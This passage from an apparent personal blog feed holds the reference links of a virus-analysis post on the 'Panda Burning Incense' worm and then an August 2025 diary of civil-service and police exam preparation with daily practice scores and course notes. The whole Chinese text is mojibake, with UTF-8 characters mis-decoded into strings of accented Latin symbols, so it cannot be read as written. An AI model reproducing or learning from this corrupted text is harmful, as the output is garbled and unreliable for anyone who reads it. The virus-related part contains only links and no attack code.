title="Refer"></a>Refer</h1><p><a href="https://www.52pojie.cn/thread-1569939-1-1.html">ç»å…¸ç—…æ¯’åˆ†æâ€”â€”ç†ŠçŒ«çƒ§é¦™ - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><a href="https://github.com/Korey0sh1/xiongmao/blob/main/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99_analysis.zip">xiongmao&#x2F;ç†ŠçŒ«çƒ§é¦™_analysis.zip at main Â· Korey0sh1&#x2F;xiongmao</a>ç¬”è€…æŠŠæ–‡ä»¶æ‰“åŒ…å¥½äº†ğŸ˜‹</p>]]></content>
    
    
    <categories>
      
      <category>Virus_Analysis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¿™é‡Œå·é—²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å…«æœˆè®°</title>
    <link href="/2025/08/31/2025-08/"/>
    <url>/2025/08/31/2025-08/</url>
    
    <content type="html"><![CDATA[<h1 id="8æœˆ"><a href="#8æœˆ" class="headerlink" title="8æœˆ"></a>8æœˆ</h1><h3 id="8-4-å‘¨ä¸€"><a href="#8-4-å‘¨ä¸€" class="headerlink" title="8.4 å‘¨ä¸€"></a>8.4 å‘¨ä¸€</h3><p>å†²åˆºç¬¬ä¸€å¤© </p><p><strong>è¡Œæµ‹ï¼š</strong></p><p>èµ„æ–™åˆ†æ 13&#x2F;20 ï¼›è¨€è¯­1 10&#x2F;12ï¼›è¨€è¯­2  7&#x2F;12ã€‚åšå®Œåå¬äº†èŠ±ç”Ÿçš„è§£æï¼Œæ”¶è·å¾ˆå¤šã€‚åšäº†ç‚¹å°ç¬”è®°</p><p><strong>ç”³è®ºï¼š</strong></p><p>å†™äº†20è”è€ƒçš„1ï¼ˆåŠ å¼ºç¤¾ä¼šæ²»å®‰ï¼‰ã€2ï¼ˆæ— è®¼ï¼‰ã€3ï¼ˆä¹‰è­¦ï¼‰ï¼Œæ„Ÿè§‰è¿˜è¡Œ</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-04_230323_934.png" style="zoom: 25%;" /><h3 id="8-5-å‘¨äºŒ"><a href="#8-5-å‘¨äºŒ" class="headerlink" title="8.5 å‘¨äºŒ"></a>8.5 å‘¨äºŒ</h3><p>å†²åˆºç¬¬äºŒå¤© </p><p><strong>è¡Œæµ‹ï¼š</strong></p><p>è¨€è¯­ 8&#x2F;12ï¼›èµ„æ–™1 16&#x2F;20ï¼›èµ„æ–™2 12&#x2F;20ï¼› èµ„æ–™3 15&#x2F;20ã€‚è¨€è¯­åšçš„éƒ½æ˜¯è¯­æ®µï¼Œè¦åšåˆ°åœ¨é¢˜ç›®ä¸ŠæŠŠå±‚æ¬¡åˆ’åˆ†å‡ºæ¥ï¼›èµ„æ–™ç°åœ¨æ„Ÿè§‰å…¨æ˜¯é¢˜ç›®å®¡é¢˜å’Œè®¡ç®—çš„çœŸæ˜¯è‰äº†ã€‚</p><p><strong>ç”³è®ºï¼š</strong></p><p>20å…¬å®‰è”è€ƒå¤§ä½œæ–‡ï¼ˆä¸æ°‘åŒå¿ƒï¼Œå…±åˆ›å’Œè°ï¼‰ã€‚ç¬¬ä¸€æ¬¡å†™ç”³è®ºå¤§ä½œæ–‡ï¼ŒåŸºæœ¬ä¸Šæ˜¯å¥—é’Ÿè¨€çš„æ€è·¯å†™çš„ï¼Œ3å¹´æ²¡å†™è®®è®ºæ–‡ï¼Œæ„Ÿè§‰å†™çš„ä¸€å¨</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250805230929_8.jpg" style="zoom:25%;" /><h3 id="8-6-å‘¨ä¸‰"><a href="#8-6-å‘¨ä¸‰" class="headerlink" title="8.6 å‘¨ä¸‰"></a>8.6 å‘¨ä¸‰</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>ç²‰ç¬”27å­£æ¨¡è€ƒå‰¯çœçº§ 62.3åˆ†ã€‚åšçš„ä¸€å¨ç¨€çƒ‚ã€‚å›¾æ¨çƒ‚å®Œäº†ï¼Œ10é“åªå¯¹äº†2ä¸ªï¼Œè¨€è¯­ä¹Ÿæœ‰ç‚¹å·®ã€‚æ•°é‡ä¸€å¦‚æ—¢å¾€çš„æ¥ä¸åŠï¼Œèµ„æ–™çœ‹èµ·æ¥å‰å‡ å¤©çš„åˆ·é¢˜è¿˜æ˜¯æœ‰æ•ˆæœçš„ã€‚</p><p>å¤ç›˜ä¹‹åæ€»ç»“äº†ä¸€ä¸‹ï¼šè¨€è¯­ä¸è¦çº ç»“ï¼Œæ˜¯ä¸ºäº†åšé¢˜ï¼ˆæ„Ÿè§‰çœŸä¸å¦‚ç›¸ä¿¡ç›´è§‰ï¼‰ï¼æ³¨é‡å‰åå¯¹åº”ï¼Œæ–‡æ®µè¦è¯»å®Œï¼å›¾æ¨çƒ‚å®Œäº†ç­‰æˆ‘åˆ·é¢˜åˆ·å¥½å†è¯´ï¼›èµ„æ–™è¿˜æ˜¯è®¡ç®—é—®é¢˜ï¼Œèƒ½ä¸èƒ½è¡¥è¯ç®—é”™äº†çƒçƒäº†ğŸ˜­ğŸ˜­ğŸ˜­</p><p>æ¥ä¸‹æ¥å°±æ˜¯å›¾æ¨ã€èµ„æ–™ã€è¨€è¯­é‡Œçš„ç‰‡æ®µé˜…è¯»åˆ·é¢˜ï¼Œæ¥ç€èƒŒèŠ±ç”Ÿè¨€è¯­700è¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831225607.png"></p><p><strong>ç”³è®ºï¼š</strong></p><p>é’Ÿè¨€å¤§ä½œæ–‡è°‹ç¯‡å¸ƒå±€äºŒåˆ·ï¼Œæ‰“ç®—å¤§ä½œæ–‡çš„è¯¾çœ‹å®Œä¹‹åè‡ªå·±å†™ä¸€ç¯‡å¤§ä½œæ–‡ã€‚</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/8a7c9e20d75b414ef623e54959ebd3c4.jpg" style="zoom:25%;" /><h3 id="8-7-å‘¨å››"><a href="#8-7-å‘¨å››" class="headerlink" title="8.7 å‘¨å››"></a>8.7 å‘¨å››</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>è¨€è¯­ï¼šè¨€è¯­1 9&#x2F;12ï¼›è¨€è¯­2 10&#x2F;12ï¼›åˆ†æ®µæ³•åˆ’åˆ†å‰åå¯¹ç­–ã€å‰åè§‚ç‚¹ã€è½¬æŠ˜ã€å¼•å‡ºè¿™äº›è¿˜æ˜¯æŒºæœ‰ç”¨çš„ï¼Œé‡åˆ°çº ç»“çš„åœ°æ–¹è¿˜æ˜¯è¦æ”¾ç©ºğŸ§ ï¼Œå›å½’æœ¬èƒ½ğŸ‘Šã€‚æ‰‹å¤´ä¸Šçº¸è´¨çš„ç‰‡æ®µé˜…è¯»ç†è§£åšå®Œäº†ï¼Œç°åœ¨æ‰“ç®—æŠŠ700è¯çœ‹å®Œå»åˆ·æ²Ÿæ§½çš„è¯ä¹‰è¾¨æã€‚</p><p>èµ„æ–™ï¼šèµ„æ–™1 19&#x2F;20ï¼›å¥½èµ·æ¥äº†å®¶äººä»¬ï¼Œå°±æ˜¯æ—¶é—´èŠ±çš„æœ‰ç‚¹é•¿ï¼Œæ–¹æ³•é€Ÿç®—ä»€ä¹ˆçš„è¦å†æ”¹è¿›ä¸€ä¸‹ã€‚</p><p>åˆ¤æ–­ï¼šä»Šå¤©ä¸»è¦çœ‹äº†å›¾æ¨ï¼Œæƒ¨è´¥è€Œå½’çœŸçš„è‰äº†ã€‚å½’ç»“äº†ä¸€ä¸‹ç«‹ä½“å›¾çš„ä¸‰ä¸ªè€ƒç‚¹â€”â€”æˆªé¢ï¼Œå±•å¼€ï¼Œæ„æˆï¼Œå­¦ä¹ äº†é©¬èµ°åŒæ—¥ã€åˆ†å±‚å‡ ä¸ªæ–¹æ³•ï¼Œæ”¶è·å¾ˆå¤§ã€‚å¯æƒœçš„æ˜¯æ²¡çº¸è´¨çš„åˆ·é¢˜èµ„æ–™ï¼Œæ˜å¤©å¼€å§‹æ¯å¤©20é“å›¾æ¨ç‹ ç‹ å¹²ã€‚</p><p><strong>ç”³è®ºï¼š</strong></p><p>çœ‹è¯¾ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5a25def994ff35469da3d731b022be72.jpg" style="zoom:25%;" /><h3 id="8-8-å‘¨äº”"><a href="#8-8-å‘¨äº”" class="headerlink" title="8.8 å‘¨äº”"></a>8.8 å‘¨äº”</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>èµ„æ–™ï¼šèµ„æ–™1 15&#x2F;20ï¼›èµ„æ–™2 17&#x2F;20ï¼›æ—¶é—´æ˜¯çŸ­äº†ï¼Œä½†æ˜¯æ­£ç¡®ç‡ä¹Ÿä¸‹å»äº†ï¼Œmdã€‚å­¦åˆ°äº†èµ„æ–™ä¸­åŸæ¥ä¹Ÿæœ‰<strong>å®¹æ–¥é—®é¢˜</strong>ã€‚è¿˜æ˜¯è¦æ³¨æ„<strong>é¦–å¹´</strong>é—®é¢˜ä»¥åŠé¢˜å¹²å®¡é¢˜ï¼Œè¿™ä¸ªæ—¶é—´ä¸èƒ½çœï¼ˆæˆ‘çœŸæ˜¯ä¸ªsbï¼‰ã€‚</p><p>åˆ¤æ–­ï¼šå›¾æ¨â€”â€”ç«‹ä½“å›¾ 20&#x2F;20ï¼›å›¾æ¨ç»¼åˆ 8&#x2F;10ã€‚çœŸæ˜¯ç¥å¥‡ï¼Œ20é“ç«‹ä½“å›¾å…¨å¯¹ï¼Œ2é“è’™Açš„å¯¹äº†å§æ§½ã€‚åæ¥ç»¼åˆä¸€ä¸ªæˆªé¢å›¾å‚»é€¼äº†ï¼Œç„¶åä¸€ä¸ªæ•°æ¨ªç«–æ²¡ååº”è¿‡æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/e9fad1af867ecb3a308da90ed38c8871.png"></p><p>è¨€è¯­ï¼šçœ‹èŠ±ç”Ÿ700è¯ä¸­ã€‚ã€‚ã€‚</p><p><strong>ç”³è®ºï¼š</strong></p><p>å¬è€é’Ÿåˆ†æ20å¹´çš„è”è€ƒå·å­ï¼Œå–œæ51åˆ†ï¼Œæˆ‘æ“äº†çœŸçš„è¦æ²¡ç­ä¸Šäº†ã€‚</p><p>ç¬¬ä¸€é¢˜æ¦‚æ‹¬å½’çº³ï¼šæ²¡æ‰¾å‡†æ’®è¦ï¼Œå†™äº†ä¸€åŠçš„æªæ–½æ•ˆæœã€‚ã€‚ã€‚</p><p>ç¬¬äºŒé¢˜å¯ç¤ºï¼šç›´æ¥è£‚å¼€ï¼Œå¯ç¤ºæ˜¯å…±æ€§ä¸­æ‰¾ç‰¹æ€§ï¼Œå®¡é¢˜ä¹Ÿæœ‰ç‚¹é—®é¢˜</p><p>ç¬¬ä¸‰é¢˜ï¼šå®¡é¢˜æ¼äº†æ³¨æ„â€åˆ›å»ºé˜Ÿä¼â€œï¼Œå¯¼è‡´å…¨æ–‡å›ç­”å°‘äº†è¿™ä¸€å¤§ç‚¹</p><p>å¤§ä½œæ–‡ï¼šäº‹ä¾‹è®ºè¯ä¸å¤Ÿä¸°å¯Œã€‚å®¡é¢˜ä¸­ä¹Ÿæ²¡æ€ä¹ˆæ³¨æ„â€œç»“åˆç»™å®šèµ„æ–™â€</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250808235131_13.jpg" style="zoom:25%;" /><h3 id="8-9-å‘¨å…­"><a href="#8-9-å‘¨å…­" class="headerlink" title="8.9 å‘¨å…­"></a>8.9 å‘¨å…­</h3><p>æ”¾ç©ºä¸€å¤©ï¼Œé›€é­‚å¯åŠ¨ï¼</p><h3 id="8-10-å‘¨æ—¥"><a href="#8-10-å‘¨æ—¥" class="headerlink" title="8.10 å‘¨æ—¥"></a>8.10 å‘¨æ—¥</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>ç²‰ç¬”ç¬¬29å­£ è¡Œæ”¿æ‰§æ³•å·æ¨¡è€ƒ 70.5åˆ†ï¼›çœ‹æ¥åˆ·é¢˜æ˜¯æœ‰æ•ˆæœçš„ï¼ç»§ç»­åŠªåŠ›ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/188e8db53b327523488bb4181015b9cb.jpg"></p><p>æ”¿æ²»ç†è®ºï¼šä¸è¯´äº†ï¼Œå…¨è’™Cæ˜¯å¯¹çš„ï¼</p><p>å¸¸è¯†ï¼šéº»äº†ï¼Œä»€ä¹ˆæ—¶å€™èƒ½æåˆ°70%æ­£ç¡®ç‡</p><p>è¨€è¯­ï¼šè¿™æ¬¡è¨€è¯­æ­£ç¡®ç‡åˆ°äº†80%ï¼èŠ±ç”Ÿçš„700è¯èƒŒç€æ˜¯çœŸçš„æœ‰æ•ˆæœçš„ï¼ç»§ç»­èƒŒï¼</p><p>æ•°é‡ï¼šåšäº†5é¢˜ï¼Œå¯¹äº†4é¢˜ï¼Œè’™å¯¹äº†1é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠ æ²¹ï¼</p><p>åˆ¤æ–­ï¼šwcnmå¸é©¬å›¾æ¨ï¼ŒèŠ±äº†15åˆ†é’Ÿæœ‰çš„ï¼Œç»“æœ4&#x2F;10ğŸ¤¡ğŸ¤¡ï¼›å¼€æ¥æ˜¯çœŸè¦æ·¦ä½ äº†</p><p>èµ„æ–™ï¼šè¿™æ¬¡èµ„æ–™éå¸¸ç®€å•ï¼ä½†æ˜¯æˆ‘è¿˜æ˜¯çŠ¯äº†2ä¸ªè®¡ç®—é”™è¯¯ï¼</p><p>æ€»çš„æ¥è¯´ä»ä¸Šå‘¨ç¬¬ä¸€æ¬¡æ¨¡è€ƒçš„54.3æå‡70.5ï¼Œç»§ç»­åŠ æ²¹ï¼çœ‹å®‰ç¥å¤ç›˜å­¦åˆ°äº†å¾ˆå¤šï¼</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250810233038_14.png" style="zoom:25%;" /><h3 id="8-11-å‘¨ä¸€"><a href="#8-11-å‘¨ä¸€" class="headerlink" title="8.11 å‘¨ä¸€"></a>8.11 å‘¨ä¸€</h3><p>è·¯è·¯æ¥è¶ŠåŸäº†ï¼Œå¾ˆéš¾å¾—ï¼Œäºæ˜¯ä¸­åˆå’Œå­Ÿè€å¸ˆã€ä¹å®ã€å¤ªå›ä»–ä»¬æ°é¥­</p><p>ä¸‹åˆæœ¬æ¥æƒ³å»æ¡Œæ¸¸é¦†ç»“æœæ¬åœ°æ–¹äº†ï¼Œé‚£åªèƒ½æ­éº»å¯åŠ¨ï¼</p><p>æ™šä¸Šå›æ¥çœ‹èŠ±ç”Ÿè¨€è¯­700è¯ï¼Œçœ‹äº†å¿«2&#x2F;3äº†</p><h3 id="8-12-å‘¨äºŒ"><a href="#8-12-å‘¨äºŒ" class="headerlink" title="8.12 å‘¨äºŒ"></a>8.12 å‘¨äºŒ</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>èµ„æ–™ï¼šç»ƒä¹ ä¸€ 12&#x2F;20 44minï¼›æˆ‘æ•²ä½ çš„ï¼Œè¿™ç¯‡çº¯çº¯ç©¶æçˆ†ç‚¸è®¡ç®—é‡å’Œè„‘ç˜«é¢˜ï¼Œå¤–åŠ æˆ‘ä¹Ÿè„‘ç˜«ï¼Œè‰äº†ï¼›ç»ƒä¹ äºŒ 18&#x2F;20 30minï¼›è¿™ç¯‡å°±ç®€å•å¤šäº†ï¼Œé”™äº†ä¸€ä¸ªæ•´ä½“çš„èŒƒå›´ç†è§£é”™è¯¯ã€‚</p><p>åˆ¤æ–­ï¼šè¿˜æ˜¯ç»§ç»­å›¾æ¨ï¼Œç»ƒä¹ ä¸€ 9&#x2F;10 10min27sï¼›ç»ƒä¹ äºŒ 9&#x2F;10 13minï¼›æ„Ÿè§‰ä¸é”™ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè”ç³»çš„æ—¶å€™åšçš„æŒºé¡ºçš„ï¼Œæ¨¡è€ƒçš„æ—¶å€™è„‘å­ä¸€ç‰‡ç©ºç™½ğŸ˜°ã€‚</p><p>è¨€è¯­ï¼šç»§ç»­çœ‹700è¯ï¼Œä¼°è®¡æ˜å¤©èƒ½çœ‹å®Œï¼›ç‰‡æ®µé˜…è¯»ç»ƒä¹ ä¸€ 15&#x2F;20ï¼Œè¦æ³¨æ„è¯­æ®µé‡Œæœ‰å¯¹ç­–ä¹‹ç±»çš„è¦æ³¨æ„ï¼ŒæŠ›å¼ƒçº ç»“ï¼Œéµä»ç¬¬ä¸€æ„Ÿè§‰ï¼</p><p><strong>ç”³è®ºï¼š</strong></p><p>21å›½è€ƒç”³è®ºçœŸé¢˜æ”¹å®š ç¬¬1ï¼ˆæ¦‚æ‹¬å½’çº³ï¼šæ‘å¯¨é“¶è¡Œï¼‰ã€2ï¼ˆç»¼åˆåˆ†æï¼šâ€œç§æˆâ€ï¼‰ã€3ï¼ˆæ¼”è®²æçº²ï¼šæ¸…æ²³ç¤¾åŒºï¼‰é¢˜ï¼Œæœ‰ç§è¯´ä¸å‡ºæ¥çš„æ„Ÿè§‰ï¼Œé™¤äº†æŠ„ææ–™ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œæ²»å›½ç†æ”¿çŸ¥è¯†ç‚¹çš„æ„Ÿè§‰ä¸€ä¸ªéƒ½æ²¡æœ‰ã€‚ã€‚ã€‚</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250812232335_16.jpg" style="zoom:25%;" /><h3 id="8-13-å‘¨ä¸‰"><a href="#8-13-å‘¨ä¸‰" class="headerlink" title="8.13 å‘¨ä¸‰"></a>8.13 å‘¨ä¸‰</h3><p><strong>è¡Œæµ‹</strong></p><p>é»‘æš—çš„ä¸€å¤©ï¼Œç²‰ç¬” 26å­£æ¨¡è€ƒ è¡Œæ”¿æ‰§æ³• 63.2 å¤§è´¥è€Œå½’</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250813233305.png" style="zoom:25%;" /><p>èµ„æ–™ï¼š14&#x2F;20 èŠ±è´¹31minï¼Œæˆ‘çœŸtmæ˜¯ä¸ªsbå•Šã€‚ç¬¬ä¸€é¢˜æ··åˆå¢é•¿ç‡åˆ¤æ–­é”™è¯¯ï¼›ç¬¬äºŒé¢˜é¢˜ç›®å¤ªç»•äº†æ²¡ç†è§£å¯¹ï¼›ç¬¬ä¸‰é¢˜åˆå¿˜äº†é¦–å¹´ï¼›ç¬¬å››é¢˜é¢˜ç›®æ¼çœ‹äº†ä¸€ä¸ªå¢é‡ï¼›ç¬¬äº”é¢˜çº¯ç›²äººï¼›ç¬¬6é¢˜é—´éš”å¢é•¿ç‡ç®—é”™ï¼Œå•Šå•Šå•Šå•Šå•Šã€‚çœ‹å®‰å­å¤ç›˜ï¼Œå°¼ç›åˆå­¦åˆ°äº†ä¸€ä¸ªé‚ªä¿®æ–¹æ³•ï¼Œç­‰é‡åˆ°äº†è¯•è¯•ã€‚å¹³æ—¶ç»ƒä¹ è¦å¼ºè¿«è‡ªå·±æ‰”ç¬”äº†æ„Ÿè§‰ï¼Œå¥½å¤šé¢˜éƒ½èƒ½çº¯ç²¹çš„ç”¨æ‰€ç»™çš„é¢˜å¹²å’Œé€‰é¡¹åˆ¤æ–­å‡ºæ¥ï¼Œä¸èƒ½ä¸€ç›´è®¡ç®—äº†ã€‚</p><p>æ•°é‡å…³ç³»ï¼š6&#x2F;10ï¼›æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå¤šåšï¼</p><p>åˆ¤æ–­æ¨ç†ï¼šè¿™æ¬¡å›¾æ¨9&#x2F;10ï¼Œé”™çš„é‚£ä¸ªè¿˜æ˜¯é€‰é¡¹é€‰é”™äº†ã€‚ã€‚ã€‚æœ‰è¿›æ­¥ï¼å®šä¹‰å’Œç±»æ¯”é”™äº†6ä¸ªï¼Œä½†æˆ‘è§‰å¾—æ˜¯è¿™æ¬¡çš„é¢˜è§£é‡Šæœ‰ç‚¹ç‰µå¼ºï¼›ä¸€æ‹–äº”é”™äº†ä¸€ä¸ªï¼Œå¯ä»¥æ¥å—</p><p>è¨€è¯­ï¼šé€‰è¯13&#x2F;15ï¼Œç»§ç»­èƒŒ700è¯ï¼Œæœ‰ç”¨ï¼åé¢é”™äº†4é“ï¼Œè¿˜æ˜¯çŠ¯äº†ç»å¸¸çš„æ²¡é€‰å¯¹ç­–ï¼Œè‡ªæˆ‘è„‘è¡¥çš„é—®é¢˜</p><p>æ”¿æ²»ç†è®ºå’Œå¸¸è¯†å†è®®ã€‚ã€‚ã€‚</p><p><strong>ç”³è®ºï¼š</strong></p><p>21å›½è€ƒç”³è®ºçœŸé¢˜æ”¹å®šâ€”â€”å¤§ä½œæ–‡ï¼šä»¥â€œâ€˜æ²»â€™æ…§â€ä¸ºé¢˜ï¼Œè°ˆè°ˆâ€œç‰©æ— å¦„ç„¶ï¼Œå¿…ç”±å…¶ç†â€å¯¹æå‡æ²»ç†æ•ˆèƒ½çš„æ·±åˆ»å¯ç¤ºã€‚</p><p>é¢ï¼Œä¸ä¼šå†™ï¼Œç­‰è§£æï¼Œæ¥½</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-13_235535_887.png" style="zoom:25%;" /><h3 id="8-14-å‘¨å››"><a href="#8-14-å‘¨å››" class="headerlink" title="8.14 å‘¨å››"></a>8.14 å‘¨å››</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>åˆ¤æ–­æ¨ç†ï¼šå›¾æ¨ç»ƒä¹ 1 8&#x2F;10ï¼Œä¸€ä¸ªä»å³å‘å·¦æ¨çš„é»‘ç™½æ±‚å¼‚æ²¡çœ‹å‡ºæ¥ï¼Œè¿˜æœ‰é¢˜æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆä¸¥è°¨ï¼›å›¾æ¨ç»ƒä¹ 2 9&#x2F;10ï¼Œé”™äº†ä¸€ä¸ªæ­£æ–¹ä½“å±•å¼€ï¼Œå…‰é¢…å†…æƒ³è±¡äº†ï¼Œæ²¡ç”»å›¾ã€‚</p><p>è¨€è¯­ï¼š700è¯å®Œç»“ï¼Œ æˆè¯­å¡«ç©ºç»ƒä¹ ä¸€ 11&#x2F;15ï¼›ç»ƒä¹ äºŒ 9&#x2F;15ï¼› ç»ƒä¹ ä¸‰ 10&#x2F;15ã€‚æ„Ÿè§‰é¢˜æ¯”è¾ƒéš¾ï¼Œå¾ˆå¤šéƒ½æ˜¯äºŒé€‰ä¸€ä¸ç¡®å®šï¼Œè¿˜å¾—å¤šç»ƒã€‚å¥‡æ€ªçš„æ˜¯å¥—å·æ¨¡è€ƒçš„æ—¶å€™æ­£ç¡®ç‡è¿˜æŒºé«˜ğŸ¤”</p><p>èµ„æ–™ï¼šåšäº†ä¸€å¥— 17&#x2F;20ï¼Œå°è¯•ç€æœ‰äº›é¢˜ä¸é è®¡ç®—ï¼Œä½†æ˜¯é”™äº†ä¸€é“è‚‰çœ¼è§‚å¯Ÿæ³•å¤±è´¥çš„ï¼Œå¯æƒœï¼Œè¿˜é”™äº†ä¸€é“è®¡ç®—é”™è¯¯å’Œä¸€é“ç†è§£æœ‰è¯¯ã€‚</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢2.14å½•æ’­è¯¾ï¼Œå†…å®¹ï¼šè¢­è­¦ã€äººæ°‘è­¦å¯ŸèŒä¸šé“å¾·è§„èŒƒã€å…¨å›½å…¬å®‰å·¥ä½œä¼šè®®ã€å…¨å›½å…¬å®‰å…å±€é•¿ä¼šè®®ã€æ–°è´¨ç”Ÿäº§åŠ›</p><p>æ³¢æ³¢3.06å½•æ’­è¯¾ï¼Œå†…å®¹ï¼šå…¬å®‰æœºå…³åŠç†è¡Œæ”¿æ¡ˆä»¶ç¨‹åºè§„å®šç¬¬ä¸€è‡³ç¬¬ä¸ƒç« ç¬¬ä¸‰èŠ‚ï¼ˆè¯¢é—®ï¼‰ã€‚å¿«é€Ÿè¿‡äº†ä¸€éçŸ¥è¯†ç‚¹ï¼Œæ­»å»çš„è®°å¿†åˆåœ¨æ”»å‡»æˆ‘bushiã€‚</p><p><strong>ç”³è®ºï¼š</strong></p><p>æ„Ÿè§‰å°é©¬å“¥çš„ç”³è®ºæ›´é€‚åˆæˆ‘çš„äºšå­ğŸ¤”</p><p>å†²å†²å†²ï¼</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250814234518_22.png" style="zoom:25%;" /><h3 id="8-15-å‘¨äº”"><a href="#8-15-å‘¨äº”" class="headerlink" title="8.15 å‘¨äº”"></a>8.15 å‘¨äº”</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>åˆ¤æ–­æ¨ç†ï¼šå›¾æ¨ç»ƒä¹ ä¸€8&#x2F;10ï¼Œç»ƒä¹ äºŒ8&#x2F;10ï¼Œæ€»ä½“è¿˜å¯ä»¥ï¼›</p><p>èµ„æ–™ï¼š18&#x2F;20ï¼Œä½†èŠ±äº†38åˆ†é’Ÿï¼Œé€ å­½å•Šã€‚å¥½å‡ é“è®¡ç®—é‡å¤§çš„é¢˜è™½ç„¶éƒ½æš´åŠ›ç®—åšå¯¹äº†ï¼Œä½†æ˜¯çœ‹äº†è§£ææ‰å‘ç°å¯ä»¥ç”¨ç›æ°´ã€æ··åˆå¢é•¿ç‡ç­‰æ–¹æ³•å…ˆå®šæ€§åˆ†æï¼Œæ’é™¤ä¸¤ä¸ªé”™è¯¯é€‰é¡¹ï¼Œç„¶åå°†å‰©ä½™ä¸¤ä¸ªé€‰é¡¹ä»£ä¸€æ’ä¸€ï¼Œè¿™æ ·è‡³å°‘èƒ½èŠ‚çœ10minæœ‰çš„ã€‚è¿˜æ˜¯å¯¹æŠ€å·§å¤ªä¸æ•æ„Ÿäº†ã€‚</p><p>è¨€è¯­ï¼š15&#x2F;20ï¼Œéƒ½é”™åœ¨æ²¡æœ‰ä¾æ®ä¸Šä¸‹æ–‡å¯¹åº”çš„æ€è·¯ã€‚</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢3.13å½•æ’­è¯¾ï¼Œå†…å®¹ï¼šã€Šå…¬å®‰æœºå…³åŠç†è¡Œæ”¿æ¡ˆä»¶ç¨‹åºè§„å®šã€‹ç¬¬ä¸ƒç« ç¬¬ä¸‰èŠ‚è‡³ç¬¬ä¸ƒç« ç¬¬å…«èŠ‚ï¼ˆåŠæ¡ˆåä½œï¼‰ï¼›ã€Šå…¬å®‰æœºå…³æ¥æŠ¥æ¡ˆä¸ç«‹æ¡ˆå·¥ä½œè§„å®šã€‹ï¼›â€œä¸‰ä¸ªå½“åœºâ€ â€”â€”å½“åœºè¿›è¡Œç½‘ä¸Šæ¥æŠ¥æ¡ˆç™»è®°ï¼Œå½“åœºæ¥å—è¯æ®ææ–™ã€å½“åœºå‡ºå…·å›æ‰§å¹¶å‘ŠçŸ¥æŸ¥è¯¢æ¡ˆä»¶è¿›å±•æƒ…å†µã€æŠ•è¯‰ä¸¾æŠ¥ç›‘ç£çš„æ–¹å¼å’Œé€”å¾„ï¼›ã€Šå…¬å®‰æœºå…³é€‚ç”¨è¡Œæ”¿å¤„ç½šè‹¥å¹²é—®é¢˜çš„æŒ‡å¯¼æ„è§ã€‹</p><p><strong>ç”³è®ºï¼š</strong></p><p>21å›½è€ƒå·ã€æ”¹ã€‘å¤ç›˜ï¼šå‰ä¸‰é¢˜æ²¡å•¥é—®é¢˜ï¼Œç†è§£éƒ½å¯¹çš„ï¼Œå°±æ˜¯è¦ç‚¹æ²¡æœ‰æ¦‚æ‹¬åˆ°ä½ï¼Œå¤–åŠ ç”¨è‡ªå·±çš„è¯­è¨€å†™æ’®è¦äº†ï¼Œåº”è¯¥ç›´æ¥ç”¨ææ–™é‡Œçš„ã€‚å¤§ä½œæ–‡â€œâ€˜æ²»â€™æ…§â€çš„å®¡é¢˜å‡ºäº†ç‚¹é—®é¢˜ï¼Œæˆ‘çš„ç†è§£æ˜¯é¡ºåº”è§„å¾‹â€”â€”&gt;é¡ºåº”æ°‘æ„ï¼Œç»“æœè€é’Ÿç»™å‡ºçš„è§£ææ˜¯é¡ºåº”è§„å¾‹â€”â€”&gt;é¡ºåº”4ä¸ªææ–™é‡Œæ€»ç»“çš„è§„å¾‹ï¼ˆè‡ªç„¶ã€å¸‚åœºã€æ–‡åŒ–ã€åŸå¸‚ã€ä»¥äººä¸ºæœ¬ã€å› åœ°åˆ¶å®œè¿™äº›ï¼‰ï¼›å¤–åŠ äº‹å®è®ºè¯çš„è¿ç”¨è¿˜ä¸æ˜¯å¾ˆåˆ°ä½ï¼Œä¸”è¿ç”¨äº‹å®è®ºè¯åæ²¡æœ‰åŠ å¯¹ç­–è®ºç‚¹ï¼Œéœ€è¦æ”¹æ­£</p><img 